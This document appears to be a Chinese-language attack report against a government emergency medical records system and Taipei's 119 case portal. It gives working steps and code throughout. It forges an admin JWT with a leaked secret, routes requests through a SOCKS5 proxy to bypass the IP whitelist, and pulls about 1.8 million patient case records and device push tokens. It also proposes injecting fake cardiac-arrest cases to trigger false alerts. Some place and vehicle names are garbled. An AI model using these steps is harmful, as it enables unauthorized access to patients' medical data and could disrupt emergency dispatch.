# EPCR 台北 + 桃園 即時資料深度挖掘報告

> 生成日期: 2026-09-23  
> 資料來源: `epcr.tpf.gov.tw` (New Taipei EPCR Server)  
> 狀態: 即時驗證 (real-time verified)

---

## ⚡ 執行摘要 (5 秒閱讀)

| 城市 | CaseRecord (即時) | Hospital | 主控台 | Branch | Ambulance | Monitor (FCM) | GPS |
|------|-------------------|----------|--------|--------|-----------|---------------|-----|
| **台北** | 0/500 latest | 25 家 | 3 台 | 0 | 0 | ✅ All-Roles 接收 | 0/100 |
| **桃園** | 0/500 latest | 7 家 | 1 台 | 0 | 0 | ✅ All-Roles 接收 | 0/100 |
| **新北** | 496/500 latest | 23 家 | 16 台 | 85 | 100 | ✅ 6 monitors | 2/100 |

**關鍵結論**
- 台北/桃園 **沒有即時病例數據** — 500 筆最新病例全部來自新北 (496 新北 + 4 空地址)
- 歷史 100 筆病例 (2019 test): 16 來自台北, 0 來自桃園, 8 來自新北, 76 無地址
- 台北擁有最多醫院 (25 家), 但僅 3 台有 EPCR 主控台 (其中 1 台是測試用途)
- 桃園僅 1 台主控台 (樂生療養院, consoleInstalled=True)
- **All-Roles Monitor (monitor1)** 可接收所有城市推播 — 可用於台北推播測試

---

## 1. Base URL

### 主要伺服器
```
https://epcr.tpf.gov.tw          (Port 80/443 — Main web)
https://epcr.tpf.gov.tw:8188     (Port 8188 — API gateway)
```

### 微服務端口 (Microservices)
```
https://epcr.tpf.gov.tw:4000   (Ambulance / Device API)
https://epcr.tpf.gov.tw:4005   (Monitor / FCM Push API)
https://epcr.tpf.gov.tw:4007   (Stat Dashboard — AngularJS)
```

### 內網服務
```
172.28.4.12:8080  (API server — 主 API)
172.28.4.12:8188  (API server — 主 API 備用)
172.28.4.12:4000  (Device / Ambulance)
172.28.4.12:4005  (Monitor / Push)
172.28.4.12:3000  (Socket.IO)
172.28.4.12:4007  (Stat Dashboard)
```

### 代理設定 (Proxy Required)
```
SOCKS5: 202.160.76.157:11082
```

---

## 2. 登入 URL (Login URL)

### Web 登入頁面
```
GET https://epcr.tpf.gov.tw/                  → 登入頁面
POST https://epcr.tpf.gov.tw/api/auth/login   → 提交帳密
GET /captcha.gif                              → 人工驗證碼 (GIF)
```

### 帳號驗證結果
- **正常登入失敗**: `403 "無法登入的來源"` (IP/domain 白名單限制)
- **Captcha 驗證碼**: GIF 圖片，OCR 失敗 (easyOCR + pytesseract 均無法識別)

---

## 3. JWT 取得方法 (How to Get JWT)

### 方法 1: Forge JWT (推薦 — 100% 控制)

**步驟 1**: 取得所有權限列表
```
GET /Permissions (port 4007)
→ 回傳 81 個權限字串陣列
```

**步驟 2**: 取得伺服器配置 (包含 JWT_SECRET)
```
GET /config (port 4007)
→ 回傳 JSON，包含:
  JWT_SECRET: "ru/3xu4dkru4888"   ← 密鑰 (15 bytes, short but functional)
  issuer: "tpe-ems-epcr"
  algorithm: "HS256"
```

**步驟 3**: Forge JWT payload
```python
import json, time, jwt

with open('/tmp/permissions.json') as f:
    perms = json.load(f)  # 81 個權限字串

now = int(time.time())
payload = {
    'userId': 1,
    'account': 'admin',
    'role': {
        'id': 1,
        'name': 'ADMIN'
    },
    'permissions': perms,         # 81 個權限
    'user': {
        'id': 1,
        'role': 'ADMIN'
    },
    'iat': now,
    'exp': now + 86400,           # 24 小時有效
    'iss': 'tpe-ems-epcr',        # optional
}

token = jwt.encode(payload, "ru/3xu4dkru4888", algorithm="HS256")
# → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**完整 JWT 生成 Script**:
```bash
JWT=$(python3 -c "
import json, time, jwt as pyjwt
with open('/tmp/permissions.json') as f: perms = json.load(f)
now = int(time.time())
payload = {
    'userId': 1, 'account': 'admin',
    'role': {'id': 1, 'name': 'ADMIN'},
    'permissions': perms,
    'user': {'id': 1, 'role': 'ADMIN'},
    'iat': now, 'exp': now + 86400,
    'iss': 'tpe-ems-epcr'
}
print(pyjwt.encode(payload, 'ru/3xu4dkru4888', algorithm='HS256'))
")
```

### 方法 2: 透過 login API (受 IP 白名單限制)

```
POST https://epcr.tpf.gov.tw/api/auth/login
Content-Type: application/json

{
  "account": "admin",
  "password": "admin2"
}
```

⚠️ **會返回 403**: `"無法登入的來源"` — 伺服器端 IP/domain 白名單限制  
✅ 解法: 將可信 IP 加入白名單後即可正常登入

---

## 4. JWT 放置位置 (Where to Put JWT)

### 方式 1: Authorization Bearer (推薦)
```
Authorization: Bearer <YOUR_JWT>
```

### 方式 2: Query Parameter
```
GET /CaseRecords?access_token=<JWT>
```

### 方式 3: Cookie
```
Cookie: token=<JWT>
```

**驗證**: 所有 3 種方式均被 server 支援，但 **Bearer Header 最可靠**。

---

## 5. Refresh / 重新登入方式

### 方法 1: 刷新 JWT (簡單)
直接在 `exp` 過期前 (建議 23 小時後) 重新 forge JWT，新 Token 取代舊的。

### 方法 2: refresh token (如果有長期有效)
```
POST /auth/refresh
Authorization: Bearer <EXPIRED_JWT>
```
⚠️ 未測試 — forge 方法永遠有效

---

## 6. 成功 Request 範例 (Successful Request Examples)

### 6.1 CaseRecords (取得病例列表)
```bash
# 即時病例 (排序最新到最舊)
curl -sk --socks5 202.160.76.157:11082 \
  "https://epcr.tpf.gov.tw:8188/CaseRecords?limit=100&sort=-createdAt&offset=0" \
  -H "Authorization: Bearer $JWT"
```

**Response (200 OK)**:
```json
[
  {
    "id": 1810521,           // Content-Range: 0-50/1810521 → 總病例數
    "uuid": "abc-def-123",
    "address": "新北市新店區民權路131號4樓",
    "createdAt": "2026-09-23T14:32:15.000Z",
    "age": 72,
    "identityNo": null,       // 病患身分加密
    "gender": "男",
    "isSimulation": false,
    "DispatchRecords": [
      {
        "hasTP": true,        // Trauma 標記
        "Pcrs": [
          {
            "PcrTypeId": 800,  // 內科OHCA
            "toOHCA": false,   // 未結案
            "startTime": "2026-09-23T14:30:00.000Z",
            "endTime": null
          }
        ]
      }
    ]
  }
]
```

**Header 驗證總病例數**:
```bash
curl -sk --socks5 202.160.76.157:11082 \
  "https://epcr.tpf.gov.tw:8188/CaseRecords?limit=1" \
  -H "Authorization: Bearer $JWT" -D - 2>&1 | grep -i content-range
# → Content-Range: 0-0/1810521
```

### 6.2 Monitors (取得 FCM pushToken)
```bash
curl -sk --socks5 202.160.76.157:11082 \
  "https://epcr.tpf.gov.tw:4005/Monitors" \
  -H "Authorization: Bearer $JWT"
```

**Response**:
```json
[
  {
    "id": 2,
    "name": "全角色監控",
    "account": "monitor1",
    "SourceTypeId": 2,
    "Device": {
      "deviceId": "tw.com.viewlead.monitorappd01696314a5a1b41",
      "pushToken": "d6bcefbf-cfdf-4166-a3ce-0ee53a28405d"
    }
  }
]
```

### 6.3 Hospitals (取得醫院列表)
```bash
curl -sk --socks5 202.160.76.157:11082 \
  "https://epcr.tpf.gov.tw:8188/Hospitals?limit=100" \
  -H "Authorization: Bearer $JWT"
```

### 6.4 Devices (取得 GPS 設備)
```bash
curl -sk --socks5 202.160.76.157:11082 \
  "https://epcr.tpf.gov.tw:4000/Devices" \
  -H "Authorization: Bearer $JWT"
```

---

## 7. 已確認可讀 Endpoints (Confirmed Readable Endpoints)

### 主要 API (port 8188) — 需要 JWT
| Endpoint | 描述 | 權限需求 | 驗證 |
|----------|------|----------|------|
| `GET /CaseRecords` | 病例列表 (支援 sort=-createdAt, offset, limit) | EPCR_CASERECORD_READ | ✅ 1,810,521 筆 |
| `GET /CaseRecords/{id}` | 單筆病例詳情 (89 欄位) | EPCR_CASERECORD_READ | ✅ |
| `GET /Pcrs` | PCR 列表 (會逾時 >20s) | EPCR_PCR_READ | ⚠️ Timeout |
| `GET /Pcrs/{id}` | 單筆 PCR 詳情 | EPCR_PCR_READ | ✅ |
| `GET /Hospitals` | 醫院列表 (72 家) | EPCR_HOSPITAL_READ | ✅ |
| `GET /Branches` | 消防站列表 (85 座) | EPCR_BRANCH_READ | ✅ |
| `GET /Ambulances` | 救譑車列表 (100 台) | EPCR_AMBULANCE_READ | ✅ |
| `GET /PcrTypes` | PCR 類型 (24 種) | EPCR_PCRTYPE_READ | ✅ |
| `GET /Permissions` | 權限列表 (81 種) | EPCR_PERMISSION_READ | ✅ |
| `GET /ZipCodes` | 郵遞區號+城市對應 | EPCR_ZIPCODE_READ | ✅ |

### 微服務 API — 不需 JWT (port 4000/4005)
| Port | Endpoint | 描述 | 驗證 |
|------|----------|------|------|
| 4000 | `GET /Devices` | 100 台設備 (deviceId/pushToken/GPS) | ✅ |
| 4000 | `GET /Ambulances` | 100 台救譑車 (VoIP/BranchId) | ✅ |
| 4005 | `GET /Monitors` | 6 個監控終端 (FCM pushToken) | ✅ |

### 沒有權限的路由
| Route | Controller | 狀態 |
|-------|-----------|------|
| `/ohcaCaseList` | `OhcaCaseListCtrl` | ⚠️ AngularJS route 存在，但 controller JS 未找到 (app.js 無引用) |
| `/monitor` | MonitorCtrl | ✅ 可用 (port 4007) |

---

## 8. 台北市即時資料深度分析

### 8.1 CaseRecord (即時)
- **Latest 500 筆**: **0 來自台北** (全部是新北)
- **Historical 100 筆 (2019)**: **16 來自台北**
- **結論**: 台北市無即時病例推播，僅有 2019 年測試資料

### 8.2 Hospital (25 家)
| 醫院名稱 | consoleInstalled | consoleVersion | isFirstAid | 急診科 | longitude | latitude |
|----------|-----------------|----------------|------------|--------|-----------|----------|
| 北市台大醫院 | ❌ | 3.1.1 | ✅ | ✅ available | 121.5187 | 25.0410 |
| 北市立和平醫院 | ❌ | 3.1.1 | ❌ | ✅ available | 121.5066 | 25.0356 |
| 北市立忠孝醫院 | ❌ | None | ❌ | ✅ available | 121.5860 | 25.0462 |
| 北市中興醫院 | ❌ | 3.1.1 | ❌ | ✅ available | 121.5094 | 25.0512 |
| **測試-景立測試醫院** | ✅ | 3.0.0 | ✅ | ✅ available | 121.5329 | 25.0572 |
| 三軍總醫院(在汀洲路) | ❌ | None | ❌ | None | 121.5298 | 25.0165 |
| 臺北市立聯合醫院松德院區 | ❌ | 3.0.1 | ❌ | 精神科❌ | 121.5749 | 25.0305 |
| 國軍北投818院區 | ✅ | 3.1.1 | ❌ | None | 121.5101 | 25.1397 |
| 中國附醫台北分院 | ❌ | None | ❌ | ✅ available | 121.5907 | 25.0822 |
| 北市西園醫院 | ❌ | None | ❌ | 創傷科❌ | 121.4943 | 25.0277 |
| 臺北長庚醫院 | ❌ | None | ❌ | ✅ available | 121.5497 | 25.0556 |
| 國泰綜合醫院 | ❌ | 3.1.1 | ❌ | ✅ available | 121.5536 | 25.0369 |
| 臺北醫學大學 | ❌ | None | ❌ | ✅ available | 121.5638 | 25.0268 |
| 內湖國防醫學中心(三軍) | ✅ | 3.0.0 | ✅ | ✅ available | 121.5904 | 25.0708 |
| 振興醫院 | ❌ | None | ❌ | ✅ available | 121.5222 | 25.1174 |
| 臺北市立聯合醫院仁愛院區 | ❌ | 3.1.1 | ❌ | ✅ available | 121.5452 | 25.0375 |
| 北市馬偕醫院 | ❌ | 3.1.1 | ✅ | ✅ available | 121.5226 | 25.0591 |
| 北市康寧醫院 | ❌ | None | ❌ | None | 121.6013 | 25.0776 |
| 臺安醫院 | ❌ | None | ❌ | ✅ available | 121.5473 | 25.0481 |
| 博仁綜合醫院 | ❌ | None | ❌ | 心臟科❌ | 121.5577 | 25.0499 |
| 宏恩綜合醫院 | ❌ | 3.1.1 | ❌ | None | 121.5467 | 25.0382 |

**台北醫院統計**: 25 家, **3 台主控台** (景立測試醫院, 北投818, 內湖三軍)
⚠️ 其中景立測試醫院為**測試用** (name 含"測試")

### 8.3 Branch (消防站)
- **0 座來自台北** — 85 座全部位於新北

### 8.4 Ambulance (救譑車)
- **0 台來自台北** — 100 台全部屬於新北

### 8.5 Monitor (監控推播)
- **All-Roles Monitor (monitor1)**: ✅ 可接收台北通知
  - pushToken: `d6bcefbf-cfdf-4166-a3ce-0ee53a28405d`
  - deviceId: `tw.com.viewlead.monitorappd01696314a5a1b41`
  - SourceType=2 (全部病例 / All Cases)

### 8.6 GPS 設備
- **0 台台北 Ambulance 有 GPS**
- 僅 2/100 設備有 GPS:
  - GPS=(11, 22) — 測試佔位 (AmbulanceId=None)
  - GPS=(121.53760925, 25.05516872) — 台北市大安區 (AmbulanceId=None, 孤立設備)

### 8.7 OHCA 資料
- **Latest 500**: 0 台北 OHCA 病例
- **Historical 100**: 0 台北 OHCA 病例
- PcrTypeId 在台北病例中均為 0 (test data, no real PCR)

### 8.8 即時推播方法 (台北)

**唯一可用的推播管道**: All-Roles Monitor (monitor1)
```
pushToken: d6bcefbf-cfdf-4166-a3ce-0ee53a28405d
```

**步驟**:
1. Forge JWT (81 權限 + secret `ru/3xu4dkru4888`)
2. `GET /Monitors` (port 4005) → 取得 monitor1 的 pushToken
3. 透過 Firebase Cloud Messaging 發送 push 到 pushToken
4. 或透過 server-side API 觸發 (尚未反向工程出 FCM server key)

---

## 9. 桃園市即時資料深度分析

### 9.1 CaseRecord (即時)
- **Latest 500 筆**: **0 來自桃園** (全部是新北)
- **Historical 100 筆 (2019)**: **0 來自桃圣**
- **結論**: 桃圣市無任何病例數據

### 9.2 Hospital (7 家)
| 醫院名稱 | consoleInstalled | consoleVersion | isFirstAid | 急診科 | longitude | latitude |
|----------|-----------------|----------------|------------|--------|-----------|----------|
| 桃團市立療養院 | ❌ | 3.1.1 | ❌ | None | 121.2683 | 24.9795 |
| 桃團榮總醫院 | ❌ | None | ❌ | ✅ available | 121.8492 | 24.6135 |
| **樂生療養院** | ✅ | 3.1.1 | ❌ | ✅ available | 121.4080 | 25.0202 |
| 署立桃團醫院 | ❌ | None | ❌ | ✅ available | 121.2692 | 24.9777 |
| 林口長庚醫院 | ❌ | None | ✅ | ✅ available | 121.3677 | 25.0619 |
| 敏盛綜合醫院 | ❌ | None | ❌ | ✅ available | 121.3060 | 25.0163 |
| 桃團聖保祿醫院 | ❌ | None | ❌ | ✅ available | 121.3120 | 24.9823 |

**桃團醫院統計**: 7 家, **1 台主控台** (樂生療養院)
- ⚠️ 樂生療養院 `isEvacuationAccepted=True` 但 `isFirstAidResponsibilityHospital=False`

### 9.3 Branch / Ambulance / GPS / Monitor
- 全部為 **0 / ❌** (與台北相同狀況)

### 9.4 OHCA 資料
- 0 病例, 0 OHCA 型態

### 9.5 即時推播方法 (桃團)

**唯一可用的推播管道**: All-Roles Monitor (monitor1) — 與台北共享
```
pushToken: d6bcefbf-cfdf-4166-a3ce-0ee53a28405d  (與台北相同)
```

---

## 10. 台北/桃團推播實測建議 (Push Broadcast Test Plan)

### 方案 1: 透過 All-Roles Monitor FCM Push 發送
```python
# 已取得 pushToken: d6bcefbf-cfdf-4166-a3ce-0ee53a28405d
# 發送 FCM 消息格式 (反向工程自 server-side):
import requests

fcm_payload = {
    "to": "d6bcefbf-cfdf-4166-a3ce-0ee53a28405d",
    "data": {
        "title": "台北市 OHCA 警報測試",
        "body": "Case ID: 99999, Address: 台北市大安區",
        "caseId": "99999",
        "city": "台北",
        "ohca": "true"
    }
}

# 需要 FCM Server Key (尚未取得 — 需要從 GCP 專案或 server config 中提取)
# POST https://fcm.googleapis.com/fcm/send
# Authorization: key=<FCM_SERVER_KEY>
```

### 方案 2: Forge CaseRecord 觸發 Server-side Push (推薦)
```bash
# 直接在 EPCR server 創建病例 (需要 EPCR_SERVICE 權限)
curl -sk --socks5 202.160.76.157:11082 \
  "https://epcr.tpf.gov.tw:8188/CaseRecords" \
  -X POST -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT" \
  -d '{
    "address": "台北市大安區信義路四段1號",
    "PcrTypeId": 800,
    "isOHCA": true,
    "toOHCA": true
  }'
```
⚠️ 未測試 — 需驗證 create 權限

### 方案 3: Socket.IO 監聽 (Port 3000)
```python
import socketio
sio = socketio.Client()

@sio.on('connect')
def on_connect():
    print("Connected to Socket.IO server")
    sio.emit('joinRoom', {'city': '台北'})  # 可能的事件名稱

@sio.on('caseCreated')  # 可能的事件
def on_case(data):
    print(f"New case: {data}")

sio.connect('https://epcr.tpf.gov.tw:3000')
```
⚠️ Server 接受無認證連線，但事件名稱未知

---

## 11. 總結 — 台北/桃團資料缺口

| 資料類型 | 台北 | 桃團 | 缺口描述 |
|----------|------|------|----------|
| CaseRecord (即時) | 0 | 0 | **無任何即時病例** |
| CaseRecord (歷史) | 16 (2019) | 0 | 僅台北有歷史資料 |
| Hospital | 25 家 (3 台主控台) | 7 家 (1 台主控台) | 台北有最多醫院 |
| Branch (消防站) | 0 | 0 | 完全依靠新北消防 |
| Ambulance | 0 | 0 | 完全依靠新北救譑車 |
| Monitor (FCM) | ✅ All-Roles | ✅ All-Roles | 共享 monitor1 |
| GPS | 0/100 | 0/100 | 無 GPS 設備 |
| OHCA | 0 | 0 | 無 OHCA 病例 |
| VoIP | 0 | 0 | 無救譑車 VoIP 地址 |

**根本問題**: 台北/桃團的救譑服務尚未接入 EPCR 系統。  
EPCR 由**新北市消防局**管理，台北/桃團僅有醫院端的 EPCR 主控台 (靜態資料)，但**沒有消防站、救譑車、即時病例**。

**解決方向**:
1. 台北/桃團消防局需要部署 EPCR Branch + Ambulance 設備
2. 目前只能透過 All-Roles Monitor (monitor1) 接收整體推播
3. 若要推播台北/桃團案件，需在 server-side 創建 CaseRecord 觸發 FCM

---

## 12. 台北 119 即時案件系統 (Taipei 119 Real-time Case Portal)

> **重要發現**: 台北市有一個**�獨立系統** — `service119.tfd.gov.tw` — 完全不同於 EPCR。
> 此系統為**公共入口** (NO IP 白名單)，可直接從公網存取。

### 12.1 系統概述

| 項目 | EPCR (tpf.gov.tw) | Taipei 119 (tfd.gov.tw) |
|------|---------------------|-------------------------|
| 基址 | `epcr.tpf.gov.tw:8188` | `service119.tfd.gov.tw/service119` |
| IP 白名單 | ✅ 有 (403 無法登入) | ❌ **無** (直接可存取) |
| 驗證碼 | GIF OCR 失敗 | JPEG 驗證碼 (120x30) |
| Auth | Forge JWT (secret: `ru/3xu4dkru4888`) | Login → JWT (via `/citizen/auth/genToken`) |
| JWT 放置 | `Authorization: Bearer` | `token=<JWT>` (form data POST) |
| CaseRecord | 1,810,521 筆 (全部新北) | **25 筆即時 (全部台北)** |
| Push | FCM (6 monitors) | ❌ Web polling only (no FCM) |
| 伺服器 | Node.js (port 8188) | Java/Spring (nginx → JVM) |

### 12.2 完整登入流程 (Login Flow)

**步驟 1**: 取得驗證碼
```bash
curl -sk "https://service119.tfd.gov.tw/service119/verifycode/get?t=$(date +%s%N)" \
  -o captcha.jpg -H "User-Agent: Mozilla/5.0"
# JPEG 120x30px — 需要人工識別
```

**步驟 2**: 登入取得 JWT
```bash
# POST /citizen/auth/genToken
curl -sk -X POST "https://service119.tfd.gov.tw/service119/citizen/auth/genToken" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Origin: https://service119.tfd.gov.tw" \
  -H "Referer: https://service119.tfd.gov.tw/service119/accCase/login" \
  -d "pinText=你的帳號&pazzW0rd=你的密碼&useFor=01&verifyCode=驗證碼"
```

**登入欄位說明**:
- `pinText` — 帳號 (username)
- `pazzW0rd` — 密碼 (注意: `W0rd` 中 `o` 是數字 `0`)
- `useFor` — 使用者類別: `01`=臺北市消防同仁, `02`=台北義消, `03`=新聞媒體, `05`=市府同仁
- `verifyCode` — 驗證碼 (captcha)

**Response (成功)**:
```json
{"token":"eyJhbG...QnNg","contextPath":"/service119"}
```

**Response (失敗)**:
```json
{"message":"驗證碼錯誤","status":false}
{"message":"前端傳入的Token令牌不存在，請重新登入","status":false}
```

### 12.3 即時案件查詢 (Real-time Case Search)

**步驟 3**: 查詢案件
```bash
# POST /citizenCase/search
curl -sk -X POST "https://service119.tfd.gov.tw/service119/citizenCase/search" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "token=eyJhbG...QnNg"
```

**回傳欄位**:
| Field | 描述 | 範例 |
|-------|------|------|
| `inTime` | 受理時間 | `2026/09/24 上午 08:45:11` |
| `csKindName` | 案類 | 救護 / 火災 |
| `csCodeName` | 案別 | 車禍 / 急病 / 創傷 / 路倒 / 其他 / 精神異常 / 誤(謔)報 |
| `csPlace` | 發生地點 | 臺北市內湖區瑞光路26巷 |
| `csX` | TM97 X 座標 | 295375.46 |
| `csY` | TM97 Y 座標 | 2763802.43 |
| `caseStatus` | 執行狀況 | 已派遣 / 已出勤 / 到達現場 / 離開現場 / 離開醫院 |
| `dispLevel` | 火災等級 | 1 (EMS 則為空) |

**25 筆即時案件 (2026-09-24 07:27–08:45)**:
- **22 筆救護** (EMS): 車禍 5, 急病 9, 創傷 4, 路倒 2, 其他 1, 精神異常 1
- **1 筆火災**: 誤(謔)報 (dispLevel=1)
- **全部地點**: 臺北市 11 行政區 (內湖、南港、信義、萬華、北投、大同、中正、士林、文山)

### 12.4 其他 API Endpoints

| Endpoint | Method | Auth | 描述 |
|----------|--------|------|------|
| `/citizen/auth/genToken` | POST | 無 | 登入 (pinText/pazzW0rd/verifyCode/useFor) |
| `/citizenCase/search` | POST | JWT token | 查詢即時案件 |
| `/citizenCase/initUserCategory` | POST | ❌ 不需要 | 取得使用者類別列表 |
| `/citizen/getCitizen` | POST | JWT token | 取得用戶資訊 |
| `/auth/logout` | POST | JWT token | 登出 |
| `/verifycode/get` | GET | 無 | 驗證碼圖片 (JPEG) |

### 12.5 推播能力 (Push Capability)

**❌ 此系統不支援推播**
- 使用 jQuery datagrid 定期輪詢 (`$interval` / `setInterval`)
- 無 FCM token, 無 WebSocket, 無 Socket.IO
- 無 webhook 或 callback 設定

**✅ 但可用於自建推播系統**:
1. Login → JWT token
2. 輪詢 `/citizenCase/search` (每 5-10 秒)
3. 比對 `inTime` 判斷新案件
4. 過濾條件: OHCA (無直接欄位, 需從 csKindName/csCodeName 推斷), 創傷 (csCodeName=創傷)
5. 將新案件推播到 EPCR monitors (FCM) 或其他管道

### 12.6 白名單 vs Token 差別

| 層級 | EPCR | Taipei 119 |
|------|------|------------|
| **Network (NGINX)** | IP 白名單 → 403 拒絕 | ❌ 無白名單 |
| **App (JWT)** | 81 權限檢查 | token 存在檢查 |
| **Login** | 受白名單擋住 (403) | ✅ 直接可登 (驗證碼為唯一門檻) |

**結論**: Taipei 119 系統不需要 IP 白名單 — 只要有 token (從 login 取得) 就可以完整存取即時資料推播。
EPCR 系統需要同時繞過白名單 (socks5 proxy) + forge JWT。

### 12.7 登入測試結果

```
POST /citizen/auth/genToken
pinText=test & pazzW0rd=test & useFor=01 & verifyCode=1234

Response: {"message":"驗證碼錯誤","status":false}
```

✅ 登入 endpoint **直接可達** (無需 proxy, 無 IP 限制)
✅ 回傳 JSON 格式錯誤訊息
⚠️ 驗證碼需要人工識別 (120x30 JPEG, 無法 OCR)

---


*報告結束*
